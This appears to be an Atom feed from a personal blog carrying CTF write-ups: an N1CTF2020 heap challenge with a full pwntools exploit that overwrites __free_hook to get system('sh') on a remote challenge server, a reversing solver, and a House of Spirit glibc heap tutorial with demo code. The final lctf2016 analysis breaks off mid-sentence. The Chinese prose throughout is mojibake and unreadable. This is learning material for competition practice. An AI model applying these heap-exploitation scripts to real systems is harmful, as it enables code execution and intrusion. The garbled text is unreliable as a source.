<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chumen77&#39;s Blog</title>
  
  <subtitle>æ°¸è¿œç›¸ä¿¡ç¾å¥½çš„äº‹æƒ…å³å°†å‘ç”Ÿï¼</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://chumen77.xyz/"/>
  <updated>2020-10-21T02:27:35.889Z</updated>
  <id>http://chumen77.xyz/</id>
  
  <author>
    <name>chumen77</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>N1CTF2020éƒ¨åˆ†wp</title>
    <link href="http://chumen77.xyz/2020/10/19/N1CTF2020%E9%83%A8%E5%88%86wp/"/>
    <id>http://chumen77.xyz/2020/10/19/N1CTF2020éƒ¨åˆ†wp/</id>
    <published>2020-10-19T09:18:47.650Z</published>
    <updated>2020-10-21T02:27:35.889Z</updated>
    
    <content type="html"><![CDATA[<h1 id="N1CTF2020éƒ¨åˆ†wp"><a href="#N1CTF2020éƒ¨åˆ†wp" class="headerlink" title="N1CTF2020éƒ¨åˆ†wp"></a>N1CTF2020éƒ¨åˆ†wp</h1><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>è°ƒè¯•one gadget èŠ±äº†è¿‘4å°æ—¶ã€‚ã€‚ğŸ˜­</p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>c++å†™çš„ç¨‹åºï¼Œå­˜åœ¨add show delçš„åŠŸèƒ½ï¼Œä½†æ˜¯è¿›å…¥å„è‡ªçš„å‡½æ•°çœ‹ï¼Œçœ‹çš„æ˜¯ç¨€é‡Œç³Šæ¶‚çš„ã€‚ä¸ªäººå‘ç°çš„åªæ˜¯å…¶æŒ‰ç…§è‡ªå·±çš„é€»è¾‘å¯¹å†…å­˜å—idx 1ï¼Œ2è¿›è¡Œå¤„ç†ã€‚</p><p>å› ä¸ºåŠŸèƒ½å¾ˆç®€å•ï¼Œå¯ä»¥ç›´æ¥ä¸Šæ‰‹è°ƒè¯•ï¼Œæ¥ç¡®å®šç¨‹åºæ˜¯å¦‚ä½•è¿ä½œçš„ã€‚</p><p>ä¸Šæ‰‹è°ƒè¯•åä¼šå‘ç°ï¼Œå…¶æ ¹æ®3ä¸ªæŒ‡é’ˆæ¥å¯¹idx 1ã€2 å¤„ç†ã€‚</p><h4 id="åŠ¨è°ƒåˆ†æ"><a href="#åŠ¨è°ƒåˆ†æ" class="headerlink" title="åŠ¨è°ƒåˆ†æ"></a>åŠ¨è°ƒåˆ†æ</h4><pre><code class="python">def add(idx,data):    sla(&#39;&gt;&#39;,&#39;1&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;ber&#39;,str(data))</code></pre><pre><code class="python">add(1,1)</code></pre><p>çœ‹ä¸‹bssæ®µ0x2032a0çš„æ•°æ®ï¼š</p><pre><code class="python">pwndbg&gt;  x/30gx 0x0002032A0 +0x5555555540000x5555557572a0: 0x0000555555769e70      0x0000555555769e780x5555557572b0: 0x0000555555769e78      0x0000000000000000</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/O7QsvP.png" srcset="/img/loading.gif" alt></p><pre><code class="python">pwndbg&gt; x/30gx 0x555555769e600x555555769e60: 0x0000000000000000      0x00000000000000210x555555769e70: 0x0000000000000001      0x00000000000000000x555555769e80: 0x0000000000000000      0x000000000000f181</code></pre><p>å†æ¬¡ï¼š</p><pre><code class="python">add(1,1)</code></pre><p>çœ‹ä¸‹bssæ®µ0x2032a0çš„æ•°æ®ï¼š</p><pre><code class="python">pwndbg&gt;  x/30gx 0x0002032A0 +0x5555555540000x5555557572a0: 0x0000555555769e90      0x0000555555769ea00x5555557572b0: 0x0000555555769ea0      0x0000000000000000</code></pre><pre><code class="python">pwndbg&gt; x/30gx 0x555555769e600x555555769e60: 0x0000000000000000      0x00000000000000210x555555769e70: 0x0000000000000000      0x00000000000000000x555555769e80: 0x0000000000000000      0x00000000000000210x555555769e90: 0x0000000000000001      0x00000000000000020x555555769ea0: 0x0000000000000000      0x000000000000f161</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/t6qFSC.png" srcset="/img/loading.gif" alt></p><p>å¯ä»¥è¿™æ ·æ¥ç€æµ‹è¯•free å’Œ delçš„åŠŸèƒ½ã€‚</p><h4 id="å°æ€»ç»“"><a href="#å°æ€»ç»“" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h4><p>é‡ç‚¹å°±æ˜¯bssæ®µå‚¨å­˜å†…å­˜å— 1 2 ä¿¡æ¯çš„3ä¸ªæŒ‡é’ˆã€‚</p><h5 id="addå‡½æ•°"><a href="#addå‡½æ•°" class="headerlink" title="addå‡½æ•°"></a>addå‡½æ•°</h5><ul><li><p>æŒ‡é’ˆ1å’Œ3æ˜¯ä¸€ä¸ªè¾¹ç•ŒæŒ‡é’ˆï¼ŒæŒ‡é’ˆ2æ˜¯æ•°æ®ç¼–è¾‘æŒ‡é’ˆã€‚æ ¹æ®æŒ‡é’ˆ2å¤„æ¥å†™numberæ•°æ®ï¼Œä¸€æ¬¡æ˜¯8ä¸ªå­—èŠ‚ï¼Œå†™å®Œåï¼ŒæŒ‡é’ˆ2ä¼šåŠ 8ã€‚</p></li><li><p>å½“æŒ‡é’ˆ2å¤§å°è¶…è¿‡æŒ‡é’ˆ3ï¼Œå…¶å°±ä¼šç”³è¯·ä¸€å—æ–°çš„å†…å­˜ï¼Œå…¶ç”³è¯·å®Œå†…å­˜å¤§å°æ˜¯ä»¥<code>0x20,0x20,0x30,0x50,0x90,0x110,0x210,0x410,0x810,0x1010</code> è¿™æ ·é€’å¢ã€‚</p></li><li><p>ç”³è¯·å®Œæ–°å†…å­˜ï¼Œä¼šæŠŠæŒ‡é’ˆ1å¯¹åº”çš„å†…å­˜å—è¿›è¡Œfreeï¼Œä¹Ÿå°±æ˜¯ä¸Šä¸€å—chunkã€‚å¹¶æŠŠä¸Šä¸€å—å†…å­˜ä¸­çš„numberå€¼è¿›è¡Œæ‹·è´åˆ°æ–°ç”³è¯·çš„å†…å­˜ä¸­ã€‚å¹¶ä¸”ä¼šæ ¹æ®ç”³è¯·åˆ°çš„chunkåœ°å€ï¼Œè¿›è¡Œå¯¹bssæ®µ3ä¸ªæŒ‡é’ˆçš„æ›´æ–°ã€‚</p><h5 id="freeå‡½æ•°"><a href="#freeå‡½æ•°" class="headerlink" title="freeå‡½æ•°"></a>freeå‡½æ•°</h5></li><li><p>è®©æŒ‡é’ˆ2å‡8.</p><h5 id="show-å‡½æ•°"><a href="#show-å‡½æ•°" class="headerlink" title="show å‡½æ•°"></a>show å‡½æ•°</h5></li><li><p>æ‰“å°å‡ºæŒ‡é’ˆ2å‡8åå¯¹åº”åœ°å€ä¸Šçš„æ•°æ®ä¿¡æ¯</p></li></ul><h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><h4 id="idx-å†…å­˜å—1"><a href="#idx-å†…å­˜å—1" class="headerlink" title="idx å†…å­˜å—1"></a>idx å†…å­˜å—1</h4><ul><li><p>addåˆ°æœ‰0x1010 chunkå—ï¼Œå…¶åŸæ¥çš„0x810ä¼šæ”¾è¿›unsortbin</p></li><li><p>free å¤šæ¬¡ï¼Œè®©æŒ‡é’ˆ2 æŒ‡å‘0x810çš„fdæˆ–è€…bkå¤„ï¼Œåˆ©ç”¨showæ³„æ¼å‡ºlibcåœ°å€</p></li><li><p>free å¤šæ¬¡ï¼Œè®©æŒ‡é’ˆ2æŒ‡å‘0x20çš„fdå¤„ï¼Œè¿›è¡Œtcache attackï¼Œä¿®æ”¹å…¶ä¸ºfree hook</p><h4 id="idx-å†…å­˜å—2"><a href="#idx-å†…å­˜å—2" class="headerlink" title="idx å†…å­˜å—2"></a>idx å†…å­˜å—2</h4></li><li><p>addæ•°æ®ï¼Œå‡†å¤‡ä¸Šfree hookï¼Œä¸Šfree hook æ”¹free hookä¸ºone gadget</p></li><li><p>ç´§æ¥ç€ç¨‹åºï¼Œå°±free ä¸Šä¸€ä¸ªchunkï¼Œå°±ä¼šè§¦å‘free hook</p></li></ul><p>ä½†æ˜¯å†™å®Œexpï¼Œä¼šå‘ç°one gadgetæ²¡æœ‰ä¸€ä¸ªå¯ä»¥æ‰“é€šçš„ï¼Œæ ˆä¸Šå­˜åœ¨å¾ˆå¤šæ•°æ®ï¼Œæ— æ³•æ»¡è¶³ã€‚å°½ç®¡ä½¿ç”¨reallocè¿›è¡Œæ ˆå¸§è°ƒæ•´ï¼Œä¹Ÿæ²¡æ³•å­ã€‚</p><p>æ­¤æ—¶çœ‹ä¸€ä¸‹å¯„å­˜å™¨ä¸Šçš„ä¿¡æ¯ï¼Œå‘ç°åˆšé€šè¿‡free hookè·³è½¬è¿‡å»åï¼Œä¸Šé¢çš„rdi rsiä»€ä¹ˆçš„éƒ½æŒ‡å‘äº†å¯æ§çš„heapæ®µï¼Œé‚£å°±ä¿®æ”¹æ€è·¯ï¼Œä¿®æ”¹free hook ä¸ºsystemï¼Œ<strong>å¹¶ä¸”æå‰ä¿®æ”¹å…¶rdiæŒ‡å‘heapæ®µçš„æ•°æ®ï¼Œä¿®æ”¹ä¸º<code>sh\x00</code></strong> ã€‚è¿™æ ·å†è§¦å‘free hookå°±å¯ä»¥<code>system(sh)</code>äº†ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/WPo0kI.png" srcset="/img/loading.gif" alt></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python# encoding: utf-8from pwn import *import timelocal_file  = &#39;./signin&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;47.242.161.199&#39;,9990)    libc = elf.libc    # libc = ELF(&#39;./libc.so&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce18 = [0x4f2c5,0x4f322,0x10a38c]roc = [0,0x2,0x4,0x6,0x8,0x9]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx,data):    sla(&#39;&gt;&#39;,&#39;1&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;ber&#39;,str(data))def free(idx):    sla(&#39;&gt;&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))def show(idx):    sla(&#39;&gt;&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))for i in range(258):    add(1,0)for i in range(458+57):    free(1)show(1)r()libc_base = int(r(15),10) - 0x3ebca0for i in range(270):    free(1)info_addr(&#39;libcbase&#39;,libc_base)free_hook = 0x3ed8e8 + libc_baseadd(1,33)add(1,free_hook-8)system = libc.sym[&#39;system&#39;] +libc_baseadd(2,0)add(2,0)free(2)free(2)add(2,26739)add(2,system)add(2,0)itr()</code></pre><h2 id="oflo"><a href="#oflo" class="headerlink" title="oflo"></a>oflo</h2><p>å­˜åœ¨èŠ±æŒ‡ä»¤ï¼Œæ— æ³•æ­£å¸¸åç¼–è¯‘ï¼Œç›´æ¥å¯ä»¥ç”¨idaæˆ–è€…gdbè¿›è¡Œè·Ÿå³å¯ã€‚ä½†æ˜¯ä¸èƒ½ç›´æ¥æ‰“å¼€ï¼Œä¼šè¢«åè°ƒè¯•ptraceæ£€æµ‹åˆ°ï¼Œå¯ä»¥attachä¸Šå»å³å¯ã€‚<strong>ï¼ˆæ³¨æ„æ˜¯rootæƒé™ä¸‹ã€‚ï¼‰</strong></p><p>å¼€å§‹ç¨‹åºè®©è¾“å…¥19ä¸ªå­—ç¬¦ï¼Œå…³é”®ä»£ç åœ¨<code>0x400a69</code>,ä½†æ˜¯åçš„æœºå™¨ç ï¼Œgdb ä¸‹watchä¸€ä¸‹ï¼Œå‘ç°æœ‰æµç¨‹åœ¨æ ¹æ®ä½ <strong>è¾“å…¥çš„ä¸œè¥¿</strong>å¤„ç†è¿™ä¸€å—çš„æœºå™¨ç ï¼Œè¾“å…¥æ­£ç¡®äº†å¯ä»¥æ‰§è¡Œä¸‹å»ã€‚åœ¨å…³é”®ä»£ç å¤„ï¼Œå¯ä»¥å‘ç°å…¶æ˜¯åœ¨å¤„ç†14ä½çš„æ•°æ®ï¼Œä½†æ˜¯åˆšå¼€å§‹è¾“å…¥çš„æ˜¯19ä¸ªï¼Œå¤šå‡ºæ¥çš„5ä¸ªä¸çŸ¥é“ä»€ä¹ˆç”¨ã€‚è°ƒè¯•ä¼šå‘ç°ï¼Œå…¶å°±æ ¹æ®å‰5ä¸ªå­—èŠ‚ï¼Œå¯¹<code>0x400a69</code>å—è¿›è¡Œå¤„ç†ï¼Œä¸€å…±å¤„ç†äº†10æ¬¡ã€‚å¯ä»¥çŒœåˆ°å°±æ˜¯<code>n1ctf</code>ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/IBvReP.png" srcset="/img/loading.gif" alt></p><p>è¿™å—å¤„ç†å®Œå…¶æ±‡ç¼–ä»£ç ï¼Œå°±æ­£å¸¸äº†ã€‚</p><pre><code class="c"> for ( i = 0; i &lt;= 13; ++i )  {    if ( *(&amp;v4 + i) != ((*(char *)(i + a1) + 2) ^ *(char *)(i + a2)) )</code></pre><p>è¿›å…¥ä»¥åå¯ä»¥çœ‹åˆ°å…³é”®ä»£ç ã€‚å…¶æ˜¯åœ¨äºèµ·åˆç¨‹åºï¼Œ<code>cat /proc/version</code>åˆ°çš„å­—ç¬¦ä¸²å–å‰14ä¸ªåœ¨è¿›è¡Œxorã€‚è¦æ˜¯ç»•è¿‡è¿™é‡Œï¼Œæ²¡æœ‰ç›¸åº”å­—ç¬¦ä¸²ï¼Œå°±ä¼šå‡ºç°é—®é¢˜ã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">key = [0x35,0x2D,0x11, 0x1A,0x49,0x7D,0x11, 0x14,0x2B,0x3B,0x3E,0x3D,0x3C,0x5F]data = [0x4C, 0x69, 0x6E, 0x75, 0x78, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x20]flag = &#39;&#39;for i in range(len(key)):    flag += chr(key[i] ^ (data[i]+2))print(flag)</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;N1CTF2020éƒ¨åˆ†wp&quot;&gt;&lt;a href=&quot;#N1CTF2020éƒ¨åˆ†wp&quot; class=&quot;headerlink&quot; title=&quot;N1CTF2020éƒ¨åˆ†wp&quot;&gt;&lt;/a&gt;N1CTF2020éƒ¨åˆ†wp&lt;/h1&gt;&lt;h2 id=&quot;signin&quot;&gt;&lt;a href=&quot;#sig
      
    
    </summary>
    
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="heap" scheme="http://chumen77.xyz/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>House of Spirit</title>
    <link href="http://chumen77.xyz/2020/10/09/House%20of%20Spirit/"/>
    <id>http://chumen77.xyz/2020/10/09/House of Spirit/</id>
    <published>2020-10-09T03:45:32.518Z</published>
    <updated>2020-10-10T06:41:06.995Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h1><p>House of Spiritï¼ˆä¸‹é¢ç§°ä¸ºhosï¼‰æ˜¯ä¸€ä¸ªç»„åˆå‹æ¼æ´çš„åˆ©ç”¨ï¼Œæ˜¯å˜é‡è¦†ç›–å’Œå †ç®¡ç†æœºåˆ¶çš„ç»„åˆåˆ©ç”¨ï¼Œ<strong>å…³é”®åœ¨äºèƒ½å¤Ÿè¦†ç›–ä¸€ä¸ªå †æŒ‡é’ˆå˜é‡ï¼Œä½¿å…¶æŒ‡å‘å¯æ§çš„åŒºåŸŸ</strong>ï¼Œåªè¦æ„é€ å¥½æ•°æ®ï¼Œé‡Šæ”¾åç³»ç»Ÿä¼šé”™è¯¯çš„å°†è¯¥åŒºåŸŸä½œä¸ºå †å—æ”¾åˆ°ç›¸åº”çš„fastbiné‡Œé¢ï¼Œæœ€åå†åˆ†é…å‡ºæ¥çš„æ—¶å€™ï¼Œå°±æœ‰å¯èƒ½æ”¹å†™æˆ‘ä»¬ç›®æ ‡åŒºåŸŸï¼ˆå¤šä¸ºå‡½æ•°æŒ‡é’ˆå’Œ<strong>è¿”å›åœ°å€</strong>ï¼‰ã€‚</p><h2 id="æ ¸å¿ƒæ¡ä»¶"><a href="#æ ¸å¿ƒæ¡ä»¶" class="headerlink" title="æ ¸å¿ƒæ¡ä»¶"></a>æ ¸å¿ƒæ¡ä»¶</h2><ul><li>æœ‰æœºä¼šè¦†ç›–ä¸€ä¸ªå †æŒ‡é’ˆå˜é‡ï¼Œä½¿å…¶æŒ‡å‘ç›®æ ‡å¯æ§çš„åŒºåŸŸ</li><li>èƒ½å¤Ÿåœ¨ç›®æ ‡å¯æ§ä½ç½®å¤„ä¼ªé€  fastbin chunk</li></ul><p>è¿™æ ·å°†å…¶è¿™ä¸ªå †æŒ‡é’ˆé‡Šæ”¾ï¼Œä¼šæ”¾åˆ°ç›¸åº”çš„fastbinï¼Œä»è€Œè¾¾åˆ°åˆ†é…æŒ‡å®šåœ°å€çš„ chunk çš„ç›®çš„ã€‚</p><h3 id="fastbin-fake-chunk-éœ€è¦ç»•è¿‡çš„æ£€æµ‹"><a href="#fastbin-fake-chunk-éœ€è¦ç»•è¿‡çš„æ£€æµ‹" class="headerlink" title="fastbin fake chunk éœ€è¦ç»•è¿‡çš„æ£€æµ‹"></a>fastbin fake chunk éœ€è¦ç»•è¿‡çš„æ£€æµ‹</h3><ul><li>fake chunk çš„ ISMMAP ä½ä¸èƒ½ä¸º 1ï¼Œå› ä¸º free æ—¶ï¼Œå¦‚æœæ˜¯ mmap çš„ chunkï¼Œä¼šå•ç‹¬å¤„ç†ã€‚</li><li>fake chunk åœ°å€éœ€è¦å¯¹é½ï¼Œ <code>MALLOC_ALIGN_MASK</code></li><li>fake chunk çš„ size å¤§å°éœ€è¦æ»¡è¶³å¯¹åº”çš„ fastbin çš„éœ€æ±‚ï¼ŒåŒæ—¶ä¹Ÿå¾—å¯¹é½ã€‚</li><li>fake chunk çš„ <strong>next chunk</strong> çš„å¤§å°ä¸èƒ½å°äº <code>2 * SIZE_SZ</code>ï¼ŒåŒæ—¶ä¹Ÿä¸èƒ½å¤§äº<code>av-&gt;system_mem</code> ã€‚(è¿™ä¸ªå¤§å°è¿˜æ˜¯å¾ˆéšæ„çš„ï¼Œä¸å¿…è¦éå¾—æ˜¯fastbin çš„size ä¾‹å¦‚ :0x1234)</li><li>fake chunk å¯¹åº”çš„ fastbin é“¾è¡¨å¤´éƒ¨ä¸èƒ½æ˜¯è¯¥ fake chunkï¼Œå³ä¸èƒ½æ„æˆ double free çš„æƒ…å†µã€‚</li></ul><h2 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h2><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){    fprintf(stderr, &quot;This file demonstrates the house of spirit attack.n&quot;);  //è°ƒç”¨ä¸€æ¬¡mallocæ¥åˆå§‹åŒ–å †      fprintf(stderr, &quot;Calling malloc() once so that it sets up its memory.n&quot;);    malloc(1);  //ç°åœ¨æˆ‘ä»¬å°†è¦†å†™ä¸€ä¸ªæŒ‡é’ˆæ¥æŒ‡å‘ä¸€ä¸ªä¼ªé€ çš„fastbinåŸŸ    fprintf(stderr, &quot;We will now overwrite a pointer to point to a fake &#39;fastbin&#39; region.n&quot;);    unsigned long long *a;  //è¿™ä¸ªå’ŒfastbinYæ— å…³,ä¸è¦è¢«è¿™ä¸ª10æ‰€éª—,fake_chunksåªæ˜¯ä¸€å—å†…å­˜    // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)    unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));  //è¿™ä¸ªåŸŸåŒ…å«äº†ä¸¤ä¸ªchunk,ç¬¬ä¸€ä¸ªä»fake_chunks[1]å¼€å§‹,å¦ä¸€ä¸ªä»fake_chunks[9]å¼€å§‹    fprintf(stderr, &quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.n&quot;, sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[9]);  //è¿™ä¸ªchunkçš„sizeå¿…é¡»ç¬¦å’Œfastbinçš„è¦æ±‚(&lt;=128 x64ä½ç³»ç»Ÿ),PREV_INUSEä½åœ¨fasybin-sized chunksä¸­ä¹Ÿæ˜¯è¢«å¿½ç•¥çš„,ä½†æ˜¯IS_MAPPEDå’ŒNON_MAIN_ARENä¼šå¼•å‘ä¸€äº›é—®é¢˜    fprintf(stderr, &quot;This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.n&quot;);    fprintf(stderr, &quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. n&quot;);    fake_chunks[1] = 0x40; // this is the size  //ä¸‹ä¸€ä¸ªfake chunkçš„sizeå¿…é¡»æ˜¯åˆæ³•çš„ã€‚ å³&gt; 2 * SIZE_SZï¼ˆåœ¨x64ä¸Šéœ€è¦&gt; 16ï¼‰å’Œï¼†&lt;av-&gt; system_memï¼ˆå¯¹äºmain arenaæ¥è¯´ï¼Œé»˜è®¤ä¸º&lt;128kbï¼‰å¹¶ä¸”å¯ä»¥é€šè¿‡nextsizeå®Œæ•´æ€§æ£€æŸ¥ã€‚ ä½†æ˜¯æˆ‘ä»¬æ— éœ€ç¬¦å’ŒFastbinçš„å¤§å°    fprintf(stderr, &quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.n&quot;);        // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8    fake_chunks[9] = 0x1234; // nextsize  //ç°åœ¨æˆ‘ä»¬å°†é€šè¿‡æœ‰ç€fake first chunksçš„fakeåŒºåŸŸåœ°å€æ¥è¦†å†™æˆ‘ä»¬çš„æŒ‡é’ˆ    fprintf(stderr, &quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.n&quot;, &amp;fake_chunks[1]);  //è¦æ³¨æ„çš„æ˜¯,chunkå¿…é¡»æ˜¯16å­—èŠ‚å¯¹é½çš„    fprintf(stderr, &quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.n&quot;);    a = &amp;fake_chunks[2];    fprintf(stderr, &quot;Freeing the overwritten pointer.n&quot;);    free(a);  //ç°åœ¨ä¸‹ä¸€æ¬¡çš„mallocå°±å°†ä¼šè¿”å›æˆ‘ä»¬çš„fake chunkäº†    fprintf(stderr, &quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!n&quot;, &amp;fake_chunks[1], &amp;fake_chunks[2]);    fprintf(stderr, &quot;malloc(0x30): %pn&quot;, malloc(0x30));}</code></pre><p>æ­£å¸¸çš„hosæ˜¯éœ€è¦ä¼ªé€ ä¸¤ä¸ªchunkçš„ã€‚</p><pre><code class="c">This file demonstrates the house of spirit attack.Calling malloc() once so that it sets up its memory.We will now overwrite a pointer to point to a fake &#39;fastbin&#39; region.This region (memory of length: 80) contains two chunks. The first starts at 0x7ffe23a56258 and the second at 0x7ffe23a56298.This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffe23a56258.... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.Freeing the overwritten pointer.Now the next malloc will return the region of our fake chunk at 0x7ffe23a56258, which will be 0x7ffe23a56260!malloc(0x30): 0x7ffe23a56260</code></pre><p>ç¨‹åºé¦–å…ˆåˆå§‹åŒ–äº†ä¸€ä¸‹å †,ç„¶åç”³è¯·äº†ä¸¤ä¸ªå˜é‡,ä¸€ä¸ªæ˜¯æˆ‘ä»¬å³å°†æ”»å‡»çš„å˜é‡ a,å¦ä¸€ä¸ªæ˜¯æˆ‘ä»¬çš„<code>fake_chunks</code></p><p>ç¨‹åºå…ˆåœ¨<code>fake_chunks[1]</code>çš„åœ°æ–¹ä¹Ÿå°±æ˜¯sizeåŸŸä¼ªé€ äº†åˆæ³•çš„size,0x40(æ»¡è¶³fastbin sizeå¤§å°,ä¸16å­—èŠ‚å¯¹é½,æ ‡å¿—ä½æ­£ç¡®)</p><p>ä¹‹ååˆåœ¨ä¸‹ä¸€å¤„ä¼ªé€ äº†ç¬¬äºŒä¸ªchunk,å³ä»<code>fake_chunks[8]</code>å¼€å§‹çš„åœ°æ–¹,è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢,å› ä¸ºæˆ‘ä»¬ç¬¬ä¸€ä¸ªfake chunkçš„sizeä¼ªé€ æˆäº†0x40,é‚£ä¹ˆæˆ‘ä»¬ç¬¬äºŒä¸ªchunkå°±éœ€è¦åœ¨å‘ä¸‹0x40çš„åœ°æ–¹ä¹Ÿå°±æ˜¯<code>fake_chunks+8</code>çš„åœ°æ–¹ä¼ªé€ ç¬¬äºŒä¸ªchunkã€‚</p><h3 id="å°æ€»ç»“"><a href="#å°æ€»ç»“" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h3><p>ä½¿ç”¨è¯¥æŠ€æœ¯åˆ†é… chunk åˆ°æŒ‡å®šåœ°å€ï¼Œä½¿ç›®æ ‡ä½ç½®æˆä¸ºå¯æ§åŒºåŸŸï¼Œå…³é”®æ˜¯è¦èƒ½å¤Ÿä¿®æ”¹æŒ‡å®šåœ°å€çš„å‰åçš„å†…å®¹ï¼Œä¼ªé€ å‡º2ä¸ªå †ï¼Œä½¿å…¶å¯ä»¥ç»•è¿‡å¯¹åº”çš„æ£€æµ‹ã€‚</p><p>è¿˜æœ‰å°±æ˜¯è¦æœ‰åŠæ³•è¦†ç›–å †æŒ‡é’ˆï¼Œåˆ°ç›®æ ‡åœ°å€ã€‚</p><h2 id="lctf2016-pwn200"><a href="#lctf2016-pwn200" class="headerlink" title="lctf2016_pwn200"></a><code>lctf2016_pwn200</code></h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>å¼€å¤´ä¸è¾“å…¥<code>\n</code>ï¼Œå¡«å……48å­—ç¬¦å¯ä»¥æ³„éœ²å‡ºstackåœ°å€</li><li>æœ‰ç¬¬ä¸€æ®µå¯æ§çš„æ ˆï¼Œä¸”å¯ä»¥è¦†ç›–åˆ°heap ptr</li></ul><pre><code class="c">int sub_400A29(){  char buf; // [rsp+0h] [rbp-40h]  char *dest; // [rsp+38h] [rbp-8h]  dest = (char *)malloc(0x40uLL);  puts(&quot;give me money~&quot;);  read(0, &amp;buf, 0x40uLL);  strcpy(dest, &amp;buf);  ptr = dest;  return sub_4009C4();}</code></pre><ul><li>ä¸€æ¬¡åªèƒ½ç”³è¯·ä¸€ä¸ªå †ï¼Œå¤§å°0-0x80,ä¸”å…ˆé‡Šæ”¾æ‰èƒ½å†æ¬¡ç”³è¯·ã€‚</li></ul><p>ä¿æŠ¤æƒ…å†µï¼Œæ— ä»»ä½•ä¿æŠ¤ï¼Œæ‰€ä»¥å¯ä»¥å†™shellcodeï¼Œjmp ä¸Šå»å³å¯ã€‚</p><h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>åˆ©ç”¨å¯æ§çš„æ ˆï¼Œhos åœ¨æ ˆä¸Šfake ä¸€ä¸ªå †ï¼Œä¿è¯å¯ä»¥æ”¹åˆ°ret address</li></ul><p>å¯ä»¥å…ˆçœ‹ä¸€ä¸‹å¯æ§æ 